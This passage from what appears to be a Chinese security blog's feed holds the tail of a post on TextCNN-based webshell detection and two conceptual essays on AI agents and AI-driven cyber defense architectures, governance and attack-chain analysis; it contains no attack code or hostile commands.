进行词分割。分割好的词传入 <code>tf.keras.layers.TextVectorization</code> 建立词库并完成向量化，然后传入 TextCNN 网络。文件的大小和熵值通过归一化处理后，传入一个二分类网络。</p><p>其中，TextCNN 网络的结构为输入层，嵌入层，3 个卷积核大小分别为 3、4、5 的卷积层，然后将 3 个卷积层的池化结果拼接后传入全连接层，插入 Dropout 层防止过拟合，最后传入输出层。二分类网络就是简单的 MLP 网络。最后将两个网络连接，获取最终的判断结果。</p><p>网络结构如下：<br><img src="/img/WebshellCNN/WebshellCNN1.png"></p><h2 id="结果评估"><a href="#结果评估" class="headerlink" title="结果评估"></a>结果评估</h2><p>训练过程中的表现如下：<br><img src="/img/WebshellCNN/WebshellCNN2.png"></p><p>模型评估结果如下：<br><img src="/img/WebshellCNN/WebshellCNN3.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;Webshell作为黑客惯用的入侵工具，是以php、asp、jsp、perl、cgi、py等网页文件形式存在的一种命令执行环境。黑客在入侵一个网站服务器后，通常会将webshell后门文件与网站服务器WEB目录下正常网页文件混在一起，通过Web访问webshell后门进行文件上传下载、访问数据库、系统命令调用等各种高危操作，达到非法控制网站服务器的目的，具备威胁程度高，隐蔽性极强等特点。&lt;/p&gt;
&lt;p&gt;本文尝试通过一个 TextCNN + 二分类网络合成的综合深度神经网络实现对于 Webshell 的静态检测。TextCNN 用于处理向量化后的词数组，二分类网络用于处理手动提取的数字化特征（文件的大小以及熵值等等）。&lt;/p&gt;</summary>
    
    
    
    <category term="Program" scheme="https://coldwave96.github.io/categories/Program/"/>
    
    <category term="Python" scheme="https://coldwave96.github.io/categories/Program/Python/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
    <category term="Webshell" scheme="https://coldwave96.github.io/tags/Webshell/"/>
    
  </entry>
  
  <entry>
    <title>智能实体在网络空间自动化防御系统中的应用</title>
    <link href="https://coldwave96.github.io/2023/11/13/IAforID/"/>
    <id>https://coldwave96.github.io/2023/11/13/IAforID/</id>
    <published>2023-11-13T04:07:36.000Z</published>
    <updated>2023-11-13T04:07:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>自动化防御作为网络安全防御的发展趋势，一直是研究和讨论的重点话题。关于人工智能如何在其中发挥作用，尤其是目前大语言模型带来的变革，使得这一领域的热度空前高涨。</p><span id="more"></span><h2 id="研究背景"><a href="#研究背景" class="headerlink" title="研究背景"></a>研究背景</h2><p>目前的网络安全面临的主要问题有：</p><ul><li>攻击技术日趋复杂：随着网络技术的不断发展，攻击者在攻击技术方面也不断创新，采用了更加复杂、隐蔽的攻击手段，传统的安全防护措施难以有效应对。</li><li>攻击目标日益扩大：随着网络技术的普及应用，网络空间已经成为人们工作、生活的重要场所，各种重要信息和系统都存储在网络空间中。攻击者不仅针对政府、企业等重要机构，也针对个人、家庭等普通用户发起攻击，攻击目标日益扩大。</li><li>攻击动机多样：攻击者的动机也越来越多样化，不仅有窃取数据、破坏系统等传统动机，还有破坏社会秩序、影响国家安全等动机。这也给网络安全防护带来了更大的挑战。</li><li>安全人才短缺：网络安全人才是网络安全防护的重要力量。随着网络安全形势日趋严峻，对网络安全人才的需求也越来越大。然而，目前我国网络安全人才短缺的现状依然存在。</li></ul><p>面对以上四个主要问题，AI技术具有巨大的潜力，可以有效应对上述挑战，</p><ul><li>针对攻击技术日趋复杂的挑战：<ul><li>AI可以利用大数据分析技术，从海量数据中发现潜在的威胁，并对威胁进行深入分析，识别其攻击意图和行为模式，提高威胁检测和分析能力。</li><li>AI可以用于开发新的安全防护技术，相较于传统规则检测技术有着更好的泛化能力，从而更加有效地防御复杂、隐蔽的攻击。</li></ul></li><li>针对攻击目标日益扩大的挑战：<ul><li>AI可以用于自动化执行安全防护任务，例如漏洞扫描、威胁情报分析等，从而减轻安全人员的工作负担，提高安全防护的效率。</li><li>AI可以根据不同目标的特点，制定针对性的安全防护措施，从而提高安全防护的效果。</li></ul></li><li>针对攻击动机多样化的挑战：<ul><li>AI可以用于综合运用多种安全防护措施，从而提高安全防护的综合效果。</li><li>AI可以根据攻击动机的变化，调整安全防护措施，从而提高安全防护的灵活性。</li></ul></li><li>针对安全人才短缺的挑战：<ul><li>AI可以用于辅助安全人员执行安全防护任务，从而提高安全人员的工作效率。</li><li>AI可以用于自动化执行安全防护任务，从而减轻安全人员的工作负担。</li></ul></li></ul><p>总体而言，AI具有强大的学习和分析能力，可以有效应对网络安全面临的各种挑战，为提高网络安全水平提供新的思路和途径。</p><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><p>人工智能（Artificial Intelligence）或者说 AI 是一个耳熟能详的名词。人工智能的潜在目标或定义包含以下四个方面：</p><ul><li>思维模仿（Thinking Humanly）：通过人工智能技术使计算机系统能够模仿人类思维模式，包括推理、学习、问题解决等方面。</li><li>行为模仿（Acting Humanly）：使计算机系统能够表现出类似人类行为的特征，如语言交流、感知环境、执行任务等，以实现与人类的自然交互。</li><li>理性思考（Thinking Rationally）：通过逻辑推理、推断和问题求解等技术，使计算机能够以理性的方式思考和决策，而不仅仅是模仿人类的行为。</li><li>理性行为（Acting Rationally）：使计算机系统能够基于逻辑推理和准则行动，以实现在特定环境下最优化的决策和行为，而不一定模仿人类的行为方式。</li></ul><p>另一个概念叫做 Intelligence Agent，简称 IA，直译为智能代理或者智能实体。早在 18，19 世纪，哲学家 Denis Diderot 就提出了类似的概念，“如果找到一只能够回答所有事情的鹦鹉，那我毫不犹豫的称它是一个智能体。“事实上，关于 Agent 的概念，其根源可追溯到亚里士多德和休谟等有影响力的思想家。从一般意义上讲，Agent 是指具有行动能力的实体，Agent 的概念涉及自主性，有着行使意志、做出选择和采取行动的能力，而不是被动地对外部刺激做出反应。在人工智能领域，Agent 是一种计算实体。从本质上讲，AI Agent 并不等同于哲学上的 Agent；相反，它是 Agent 这一哲学概念在人工智能领域的具体化。我们将 AI Agent 视为能够使用传感器感知周围环境，做出决策，然后使用执行器采取行动的人造实体。</p><p>IA 的发展趋势大致如下：</p><ul><li>从最开始的符号式 Agents，典型代表为基于知识库的专家系统；</li><li>接着是反应式 Agents，根据环境的变化作出相应行动；</li><li>然后是如 AlphaGo 一般基于强化学习技术的 Agents；</li><li>再下面是结合了迁移学习和元学习技术的 Agents；</li><li>大语言模型横空出世之后，目前基于大语言模型的 Agents 成为全新的研究方向。</li></ul><h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h2><p>为此我们提出基于GDDRR模型的智能防御体系，主要理念是在实战中实现治理、检测、决策、响应、恢复五项任务的快速高效循环。在智能 Agents 驱动下的智能防御体系概述如下：</p><ul><li>为了实现系统高效运行，基于 Stix 2.1 框架，我们设计了一套完整的安全数据表示框架。在治理阶段，如威胁情报、资产台账、安全运营数据等均转换到统一的数据表示框架中去。通过知识图谱技术，存储到图数据库中，便于建立和展示数据实体间的相互关系。该阶段可参与的 Agents 类型包括符号式 Agents，反应式 Agents 以及大语言模型 Agents。</li><li>在检测阶段，符号式 Agents，具有迁移学习和元学习功能的 Agents 以及基于大语言模型的 Agents 通过学习人类安全专家的思维行为范式，在传统的基于机器学习、深度学习的检测小模型以及基于 pattern 匹配的规则引擎辅助下，快速高效的实现单步攻击识别。并在接下来的决策阶段，通过上下文的关联分析，将多种单步攻击串联，以攻击链的形式识别复合攻击，生成安全事件。</li><li>在响应和恢复阶段，反应式 Agents，基于强化学习技术的 Agents，联合迁移学习和元学习 Agents和大语言模型 Agents，根据单步攻击和复合攻击的研判结果，与对应安全产品交互，执行攻击阻断和风险修复的动作。</li><li>接下来又开始新一轮的循环，在全新的治理阶段中，更新上一轮循环提炼出的资产信息变更、运营数据变更以及攻防技战法等数据。循环往复，实现自洽的智能防御体系。</li></ul><h2 id="具体结构"><a href="#具体结构" class="headerlink" title="具体结构"></a>具体结构</h2><p>以大语言模型 Agents 为例，我们认为 IA 可分为 3 个模块，脑模块，感知模块和行动模块。</p><h3 id="脑模块"><a href="#脑模块" class="headerlink" title="脑模块"></a>脑模块</h3><p>脑模块作为 IA 的中央处理核心，它的首要功能是自然语言交互功能，其中涉及到核心问题有：</p><ul><li>多轮交互下的信息有效性和统一性问题；</li><li>高质量自然语言生成问题；</li><li>语言中隐藏含义的理解问题等。</li></ul><p>第二个功能涉及到知识领域，每个 IA 需要了解对应的知识，大体上可分为 3 种：</p><ul><li>语言知识，意味着 IA 需要了解输入的统一数据表示的意义；</li><li>常识知识；</li><li>专业领域知识。</li></ul><p>第三个是记忆功能，如何保证多轮交互以及多 Agent 交互之后的信息同步是很重要的课题。为此可能的解决办法有：</p><ul><li>提升 transformer 模型的长度限制；</li><li>将信息抽象提炼，再存入记忆模块；</li><li>压缩信息，寻找更为高效的信息表示方法；</li><li>共享记忆，类似外挂知识库的方案，但是这种做法又会涉及到数据隐私和安全的问题，我们后面再讨论。</li></ul><p>第四个是推理和规划功能，旨在培养 IA 形成人类一样的链式思维，一步一步的进行推导和规划。</p><p>最后是学习功能，为了形成自洽的系统，IA 必须要自主学习，从而摆脱必须依赖人类指令运行的情况。</p><h3 id="感知模块"><a href="#感知模块" class="headerlink" title="感知模块"></a>感知模块</h3><p>第二个是感知模块，这个模块相对而言比较简单明了，就是将多源异构的数据转换成统一的数据表示。</p><h3 id="行为模块"><a href="#行为模块" class="headerlink" title="行为模块"></a>行为模块</h3><p>最后一个是行为模块，这也是 IA 相对比较重要的模块。主要分为 2 个子功能：</p><ul><li>第一个是文字输出功能，即将抽象的统一数据转换成人类理解的自然语言。</li><li>第二个是工具模块。这里主要考虑的是在响应和恢复阶段，IA 需要能够根据分析研判结果，调用甚至制造对应的工具实现攻击阻断和风险修复等工作任务。</li></ul><h3 id="信息交互"><a href="#信息交互" class="headerlink" title="信息交互"></a>信息交互</h3><p>介绍完 Agent 架构之后，下面简要介绍一下系统内信息交互的模式。</p><p>首先对于单个 Agent 来说，主要分为3种情况：</p><ul><li>第一种是任务导向，那么这个 IA 只需要接受输入，根据人类指定的行为范式给出输出；</li><li>第二种是灵感导向，意思是人类给出一个目标，IA从结果逆推，自行寻找需要的输入并完成目标；</li><li>第三种是生命周期导向，是指类似 AutoGPT 那样的实体，自身实现一个任务的闭环运行无需人类的指令。</li></ul><p>对于 Agents 之间的交互场景概括起来其实很简单，就分为两种情况：</p><ul><li>一是多个 Agents 合作完成任务的模式；</li><li>二是 Agents 之间通过对抗的模式相互促进。</li></ul><p>最后是人机交互，也分为两种情况：</p><ul><li>一是指导-执行范式。指人类给出指令，指导 IA 执行对应动作；</li><li>二是合作范式，指人咧和机器合作完成相应任务目标。</li></ul><h2 id="困难与挑战"><a href="#困难与挑战" class="headerlink" title="困难与挑战"></a>困难与挑战</h2><p>理论框架介绍完成之后，接下来是面临的一些困难和挑战：</p><ul><li>首先是数据隐私和安全问题。目前以及未来都面临着 Agent 即服务的情况，指的是 Agent 就是人机交互的接口。IA 需要接触大量的数据去完成对应的任务，与之交互的人也就等于变相的接触到了这些数据。如何在这个环节中做好隐私数据防泄露，数据访问控制等问题至关重要。</li><li>第二个问题是，AI 模型本身因为数据集不平衡，算法不公平等客观条件的制约，存在定型观念和偏见。如何在多 Agents 交互的系统中始终保证平衡，不因为害群之马导致整个系统偏离方向也是个挑战。</li><li>为此，针对这样一个自洽的系统，需要一套行之有效的评估系统和约束手段，包含但不限于数据治理、算法治理、系统治理和伦理治理等方面。</li></ul><p>除了上面提到的困难与挑战，其实还有两点疑思值得进一步研究：</p><ul><li>首先是可信度问题。当人过于依赖智能的时候，保证结果的高置信度就是极大的考验，一些简单的小模型能够做到这一点，但是上升到庞大的系统可能需要全新的机制来保障。</li><li>其次是可靠性问题。对抗训练是目前机器学习领域热门的话题，即如何保证模型的鲁棒性，使其即使在受到特定攻击的情况下依然能够给出正确的判别结果。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以大语言模型为代表的 AI 技术给未来的体系架构带来了无限的可能，当然其中也暗藏着种种问题。当然我们应该对 AI 技术保持信心，毕竟它已经实现了许多人类之前难以想象的功能。未来的研究方向将聚焦于智能 Agent 的新方向，以及人工智能技术与网络安全自动化防御的更多结合。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;自动化防御作为网络安全防御的发展趋势，一直是研究和讨论的重点话题。关于人工智能如何在其中发挥作用，尤其是目前大语言模型带来的变革，使得这一领域的热度空前高涨。&lt;/p&gt;</summary>
    
    
    
    <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/Theories/AI/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
    <category term="IA" scheme="https://coldwave96.github.io/tags/IA/"/>
    
    <category term="GenAI" scheme="https://coldwave96.github.io/tags/GenAI/"/>
    
  </entry>
  
  <entry>
    <title>智能防线：AI 驱动的网络空间防御体系</title>
    <link href="https://coldwave96.github.io/2023/10/19/IntelligenceDefence/"/>
    <id>https://coldwave96.github.io/2023/10/19/IntelligenceDefence/</id>
    <published>2023-10-18T23:50:23.000Z</published>
    <updated>2023-10-18T23:50:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本文论题为《智能防线：AI 驱动的网络空间防御体系》，主要从人工智能在网络空间安全智能防御体系中的现状、挑战、机遇与应用前景等方面综合阐述 AI + 智能防御的理念。</p><span id="more"></span><h3 id="网络安全目前面临的挑战"><a href="#网络安全目前面临的挑战" class="headerlink" title="网络安全目前面临的挑战"></a>网络安全目前面临的挑战</h3><p>网络安全目前面临的挑战主要包括以下几个方面：</p><ul><li>攻击技术日趋复杂：随着网络技术的不断发展，攻击者在攻击技术方面也不断创新，采用了更加复杂、隐蔽的攻击手段，传统的安全防护措施难以有效应对。例如，勒索软件攻击、供应链攻击、零日漏洞攻击等，都对网络安全造成了严重威胁。</li><li>攻击目标日益扩大：随着网络技术的普及应用，网络空间已经成为人们工作、生活的重要场所，各种重要信息和系统都存储在网络空间中。攻击者不仅针对政府、企业等重要机构，也针对个人、家庭等普通用户发起攻击，攻击目标日益扩大。</li><li>攻击动机多样：攻击者的动机也越来越多样化，不仅有窃取数据、破坏系统等传统动机，还有破坏社会秩序、影响国家安全等动机。这也给网络安全防护带来了更大的挑战。</li><li>安全人才短缺：网络安全人才是网络安全防护的重要力量。随着网络安全形势日趋严峻，对网络安全人才的需求也越来越大。然而，目前我国网络安全人才短缺的现状依然存在。</li></ul><h3 id="AI-在解决网络安全问题中的潜力"><a href="#AI-在解决网络安全问题中的潜力" class="headerlink" title="AI 在解决网络安全问题中的潜力"></a>AI 在解决网络安全问题中的潜力</h3><p>人工智能（AI）在解决网络安全问题方面具有巨大的潜力，可以有效应对上述挑战，</p><p>针对攻击技术日趋复杂的挑战，AI可以通过以下方式发挥作用：</p><ul><li>提高威胁检测和分析能力。AI可以利用大数据分析技术，从海量数据中发现潜在的威胁，并对威胁进行深入分析，识别其攻击意图和行为模式。</li><li>开发新的安全防护技术。AI可以用于开发新的安全防护技术，例如基于机器学习的防火墙、入侵检测系统等，这些技术可以更加有效地防御复杂、隐蔽的攻击。</li></ul><p>针对攻击目标日益扩大的挑战，AI可以通过以下方式发挥作用：</p><ul><li>提高安全防护的自动化水平。AI可以用于自动化执行安全防护任务，例如漏洞扫描、威胁情报分析等，从而减轻安全人员的工作负担，提高安全防护的效率。</li><li>提高安全防护的针对性。AI可以根据不同目标的特点，制定针对性的安全防护措施，从而提高安全防护的效果。</li></ul><p>针对攻击动机多样化的挑战，AI可以通过以下方式发挥作用：</p><ul><li>提高安全防护的综合性。AI可以用于综合运用多种安全防护措施，从而提高安全防护的综合效果。</li><li>提高安全防护的弹性。AI可以根据攻击动机的变化，调整安全防护措施，从而提高安全防护的灵活性。</li></ul><p>针对安全人才短缺的挑战，AI可以通过以下方式发挥作用：</p><ul><li>辅助安全人员工作。AI可以用于辅助安全人员执行安全防护任务，从而提高安全人员的工作效率。</li><li>自动化执行安全防护任务。AI可以用于自动化执行安全防护任务，从而减轻安全人员的工作负担。</li></ul><p>总体而言，AI具有强大的学习和分析能力，可以有效应对网络安全面临的各种挑战，为提高网络安全水平提供新的思路和途径。</p><h2 id="AI-对网络安全的革命性影响"><a href="#AI-对网络安全的革命性影响" class="headerlink" title="AI 对网络安全的革命性影响"></a>AI 对网络安全的革命性影响</h2><h3 id="AI-技术的简要概述"><a href="#AI-技术的简要概述" class="headerlink" title="AI 技术的简要概述"></a>AI 技术的简要概述</h3><p>人工智能的潜在目标或定义：</p><ul><li>思维模仿（Thinking Humanly）：通过人工智能技术使计算机系统能够模仿人类思维模式，包括推理、学习、问题解决等方面。</li><li>行为模仿（Acting Humanly）：使计算机系统能够表现出类似人类行为的特征，如语言交流、感知环境、执行任务等，以实现与人类的自然交互。</li><li>性思考（Thinking Rationally）：通过逻辑推理、推断和问题求解等技术，使计算机能够以理性的方式思考和决策，而不仅仅是模仿人类的行为。</li><li>理性行为（Acting Rationally）：使计算机系统能够基于逻辑推理和准则行动，以实现在特定环境下最优化的决策和行为，而不一定模仿人类的行为方式。</li></ul><h3 id="AI-在网络安全中的应用案例"><a href="#AI-在网络安全中的应用案例" class="headerlink" title="AI 在网络安全中的应用案例"></a>AI 在网络安全中的应用案例</h3><p>人工智能（AI）在网络安全领域的应用日益广泛，以下是目前部分应用场景</p><ul><li>威胁检测和分析：基于机器学习的威胁检测和分析系统，这些系统可以从海量数据中发现潜在的威胁，并对威胁进行深入分析，识别其攻击意图和行为模式。</li><li>安全防护：基于机器学习的防火墙、入侵检测系统等，这些技术更加有效地防御复杂、隐蔽的攻击。</li><li>安全运营：自动化执行安全运营任务，例如漏洞扫描、威胁情报分析等，从而减轻安全人员的工作负担，提高安全运营的效率。</li></ul><h3 id="AI-在提高网络安全性能方面的潜在优势"><a href="#AI-在提高网络安全性能方面的潜在优势" class="headerlink" title="AI 在提高网络安全性能方面的潜在优势"></a>AI 在提高网络安全性能方面的潜在优势</h3><p>AI在提高网络安全性能方面具有许多潜在优势，其中一些包括：</p><ul><li>实时威胁检测：AI可以实时监测和分析网络活动，并快速检测到潜在的安全威胁，从而提高威胁检测的速度和准确性。</li><li>智能自动化响应：借助AI的自动化能力，可以快速响应安全威胁，自动隔离受感染的设备或阻止恶意流量，从而加快安全事件的响应速度并降低潜在的损失。</li><li>异常行为识别：AI可以识别网络中的异常行为模式，并自动发出警报或阻止可疑的活动，从而帮助提高对新型威胁的识别能力。</li><li>自动化安全补丁管理：AI可以帮助自动管理系统和软件的安全补丁更新，确保网络中的设备始终处于最新的安全状态，从而减少由于漏洞和脆弱性导致的安全风险。</li><li>大规模数据分析：AI可以分析和处理大规模的安全数据，从而识别出潜在的威胁模式和趋势，帮助提前预防未来可能的网络安全威胁。</li><li>智能身份验证和访问控制：AI可以实现更强大的身份验证和访问控制，包括基于生物特征的身份识别和行为分析，从而提高网络中数据和资源的安全性。</li></ul><p>通过利用这些潜在优势，AI可以在提高网络安全性能方面发挥重要作用，帮助组织应对日益复杂的网络安全威胁和风险。</p><h3 id="大语言模型带来的行业冲击与变革"><a href="#大语言模型带来的行业冲击与变革" class="headerlink" title="大语言模型带来的行业冲击与变革"></a>大语言模型带来的行业冲击与变革</h3><p>从 2018 年的 GPT-1，到 2022 年 11 月正式发布的 ChatGPT，再到 2023 年 3 月发布的最新 GPT-4，大语言模型的浪潮也给网络安全行业带来巨大的变革， 包括但不限于以下几个方面：</p><ul><li>增强攻击能力：恶意行为者可以利用大语言模型的能力来生成更真实、更具欺骗性的网络钓鱼邮件、虚假信息以及伪造的内容，使得传统的安全防御手段变得更加困难。</li><li>智能安全防御：大语言模型的引入推动了智能安全防御技术的发展，使得安全防御系统具备更强大的自动化和智能化能力，能够更准确地识别和应对复杂的网络安全威胁。</li><li>数据隐私挑战：大语言模型在训练过程中需要大量的数据，这可能涉及到大量的个人隐私信息。网络安全行业面临着确保这些数据安全的挑战，包括加强数据保护、隐私保密和安全存储等方面的工作。</li><li>新型安全解决方案：针对大语言模型带来的新型安全挑战，网络安全行业不断探索并研发新的安全解决方案，包括基于AI的安全分析、大数据分析技术、以及对抗生成网络（GAN）等技术的应用，以提升网络安全的防御能力。</li><li>人才需求变化：随着大语言模型技术的不断发展，网络安全行业对具备AI技术背景的专业人才的需求日益增加，这促使了相关人才的培养和网络安全领域的人才结构调整。</li></ul><p>总的来说，大语言模型的出现既带来了网络安全行业面临的新挑战，也催生了一系列新的安全解决方案和发展机遇，推动了网络安全行业朝着更加智能化、自动化和专业化的方向发展。</p><h2 id="AI-治理下的网络安全挑战与未来展望"><a href="#AI-治理下的网络安全挑战与未来展望" class="headerlink" title="AI 治理下的网络安全挑战与未来展望"></a>AI 治理下的网络安全挑战与未来展望</h2><h3 id="隐私保护与数据安全挑战"><a href="#隐私保护与数据安全挑战" class="headerlink" title="隐私保护与数据安全挑战"></a>隐私保护与数据安全挑战</h3><p>在当前以及即将到来的 AI 驱动下的智能防御体系中，网络安全隐私保护与数据安全面临着诸多挑战，包括但不限于以下几个方面：</p><ul><li>隐私数据泄露风险：在AI分析和处理数据的过程中，存在着隐私数据泄露的风险，尤其是在涉及个人敏感信息的场景中，需要采取有效措施确保数据的安全性和隐私性。</li><li>数据访问控制困难：在复杂的网络环境下，管理和控制数据的访问权限变得更加困难，特别是当涉及多个数据源和多个AI模型的情况下，确保数据只被授权的人员和系统访问是一个挑战。</li><li>数据集成与安全性：在整合不同来源的数据用于AI分析时，需要解决数据的完整性、一致性和安全性问题，确保数据集成的过程不会导致数据泄露或篡改。</li><li>数据算法安全性：AI算法的安全性也是一个挑战，恶意用户可以通过操纵训练数据或者攻击AI模型来获取敏感信息，因此需要加强对算法的安全性分析和保护措施。</li><li>法规合规与数据安全：在数据传输和处理过程中，由于数据保护法规存在差异，合规性问题成为数据安全的重要考量因素，需要建立符合不同法规的数据安全管理制度。</li></ul><p>为应对这些挑战，需要建立完善的数据安全管理制度和隐私保护机制，包括加密技术的应用、访问控制的强化、安全审计和监控系统的建立，以及遵循法规合规标准等措施，以确保在AI治理下网络安全隐私保护与数据安全得到有效维护。</p><h3 id="建立可信的-AI-治理框架"><a href="#建立可信的-AI-治理框架" class="headerlink" title="建立可信的 AI 治理框架"></a>建立可信的 AI 治理框架</h3><p>可信的 AI 治理框架应该从以下几个方面入手：</p><ul><li>数据治理：确保 AI 系统使用的数据安全可靠、符合隐私保护要求。<ul><li>制定数据采集、使用、存储、销毁等方面的规范，确保数据安全可靠、符合隐私保护要求。</li><li>建立数据安全审计制度，定期对数据进行安全检查，发现和修复安全漏洞。</li><li>完善用户隐私保护机制，保障用户的知情权、选择权和同意权。</li></ul></li><li>算法治理：确保 AI 系统的算法透明可解释、公平无偏。<ul><li>要求 AI 系统的算法透明可解释，使用户能够理解 AI 系统的决策过程。</li><li>建立算法公平性评估机制，确保 AI 系统的决策结果公平无偏。</li><li>制定算法安全审计规范，定期对算法进行安全检查，发现和修复安全漏洞。</li></ul></li><li>系统治理：确保 AI 系统的安全性、可靠性、可持续性。<ul><li>制定 AI 系统的安全设计规范，确保 AI 系统的安全性和可靠性。</li><li>建立 AI 系统的安全测试机制，确保 AI 系统能够抵御常见的攻击。</li><li>制定 AI 系统的安全应急响应预案，快速响应和处置安全事件。</li></ul></li><li>伦理治理：确保 AI 系统的使用符合伦理规范。<ul><li>制定 AI 系统的伦理规范，确保 AI 系统的使用符合伦理要求。</li><li>建立 AI 系统的伦理审查机制，确保 AI 系统的使用符合伦理规范。</li></ul></li></ul><h3 id="面向未来的网络空间智能防御体系"><a href="#面向未来的网络空间智能防御体系" class="headerlink" title="面向未来的网络空间智能防御体系"></a>面向未来的网络空间智能防御体系</h3><p>提到智能防御体系，肯定离不开人工智能技术的加持。传统的人工智能在安全领域的应用局限于单点的小模型，无法在全局上把握安全态势，依然需要大量的安全专家投入海量数据的分析整合。在大模型介入之后，通过其优秀的文本理解能力和文本生成能力，有希望作为调度中台，扮演安全专家的角色，收集规则引擎或人工智能小模型的研判结果并分析上下文，确定安全事件后联动安全产品及时响应。</p><p>智能代理（Intelligence Agents）的概念并不陌生，借鉴斯坦福大学研究的 AI 小镇项目，结合大模型提出了生成式代理（Generative Agents）这一角色。根据他们的研究，建立 25 个独立的生成式代理，通过共享记忆等机制保证信息在代理间传递的统一性，实现了一个一定程度上自洽的社会。这个项目给力我们一定的启发，在智能防御体系中，我们也可以定向的训练出不同用途的生成式代理，它们各司其职，最终实现一个完整自洽的分析研判，联动防御的自动化系统。</p><p>为了实现这样的目标，需要进一步研究的技术包括：</p><ul><li>网络安全知识的抽取和融合<ul><li>网络安全知识的来源广泛，包括漏洞库、病毒库、告警数据、安全厂商的检测结果、安全论坛、网络安全事件报告资产描述等，为构建大规模的网络安全知识大脑，需要首先从不同来源的网络安全数据中抽取知识，并对不同领域的网络安全知识进行有效融合。</li><li>网络安全数据主要以文本数据、结构化数据、 半结构化数据等类型为主，可以采用人工智能技术对数据进行抽取。例如，可以使用word2vec 技术将文本中的单词转换为向量，结合卷积神经网络 （CNN），BiLSTM，条件随机场算法（CRF）等技术进行实体和关系识别，同时按照网络安全知识的类型进行分类，并将分类以后的实体和关系添加到对应网络安全知识的实例中进行保存。</li><li>由于网络安全中用于训练的预料数据有限，可能无法覆盖所有的网络安全知识，因此需要根据已有的网络安全知识进行推理，生成新的知识。此类知识推理的方法主要包括两种，一种是自定义推理规则，根据预先制定的规则进行知识推理和演绎；第二种是采用智能化技术，根据已有的知识进行概率推理，计算新知识存在的概率。第一种方法需要人为地定义推理规则，可扩展性较差；第二种方法使用深度神经网络进行计算新知识存在的概率，可扩展性强，但是可解释性较第一种方法差一些。</li><li>不同数据源抽取得到的网络安全知识可能会有不同的描述方式，因此需要对网络安全知识进行有效融合。常用的融合方法包括实体对齐、基于知识表示的消歧等，基本思想是将不同的网络安全知识库按照实体和关系的统一描述进行融合。</li></ul></li><li>网络安全知识表示<ul><li>常用的知识表示模型包括符号逻辑、语义网、专家系统、知识图谱、MDATA 模型等，通过知识表示可以将网络安全中不同类型的知识描述为统一的形式，并可通过知识的向量化进行高效计算。</li><li>知识图谱主要采用”&lt; 实体，关系，实体 &gt;”这种三元组形式对具体的知识进行表示。知识图谱能有效描述网络安全知识，但是当知识动态变化时，对应的三元组及相关联的知识很难及时更新。</li><li>MDATA 模型对实体之间的关系、属性的时空特性进行表达，从而有效表示网络安全知识的动态变化情况。具体而言，在关系和实体属性上增加了时间和空间特性，如某系统存在漏洞的知识，添加存在漏洞的时间区间，从而能更详细地表示系统的实际安全情况。网络攻击可能通过不同的 IP（网络 之间互连的协议）地址等，攻击事件中的 IP 地址等特性则作为网络安全知识中的空间特性。MDATA 模型通过对时间、空间特性的描述，可以表示出网络安全知识的动态变化过程。</li></ul></li><li>网络安全知识大脑构建<ul><li>网络安全知识大脑的构建包括两部分：网络安全知识库（SeKG）和场景知识库（ScKG）。其中，网络安全知识库是通用的网络安全知识的集合，并且可以随时或定期更新补充；而场景知识库是特定知识的集合，可以依据仿真攻击的设定而定，也是描述具体攻击行为的知识库。</li><li>网络安全知识库和场景知识库可以根据概念、实例、关系、属性、规则的五元组模型进行构建。</li></ul></li><li>基于网络安全知识大脑的攻击事件研判<ul><li>网络空间防御面临的主要威胁是网络攻击，一般而言网络攻击可以分为单步攻击和复合攻击。单步攻击可以理解为针对某资产发动的离散的攻击，而复合攻击可以理解为是有多个单步攻击排列组合而成的，也就是说复合攻击有多个攻击步骤，而这些攻击步骤之间是有关系的，不是离散的、无关联的，攻击步骤之间有因果关系、顺承关系、选择关系等。</li><li>单步攻击的研判相对而言简单，已有的基于规则、特征的检测方法能取得很高的成功率。而复合攻击的检测难度大，典型的复合攻击包括 APT 攻击等。复合攻击通常是以攻击链的形式发生的，可以看作是多个单步攻击的排列组合。</li><li>使用网络安全知识大脑研判网络攻击时，可利用有限状态机，设置初始状态、中间状态、终止状态和触发条件，并添加容错机制，可以在缺失数据的时候仍然生成复合攻击的攻击链，在网络安全知识库和场景知识库的基础上，描述复合攻击的各个步骤之间的关系，然后根据攻击步骤的关系、时间先后关系、IP 的传播关系等来判断是否可以生成攻击链。如果满足，则输出复合攻击的攻击链，如果不满足，就去知识库中查找等价的步骤，或补充生成攻击链并输出。当输入的数据中存在误报和漏报的情况时，基于网络安全知识大脑的研判可以自动补全缺失的信息，生成一条完整的攻击链，从而提高攻击研判的准确率，为网络安全主动防御提供支撑。</li></ul></li></ul><h2 id="结论与行动呼吁"><a href="#结论与行动呼吁" class="headerlink" title="结论与行动呼吁"></a>结论与行动呼吁</h2><h3 id="总结-AI-在网络安全中的关键作用"><a href="#总结-AI-在网络安全中的关键作用" class="headerlink" title="总结 AI 在网络安全中的关键作用"></a>总结 AI 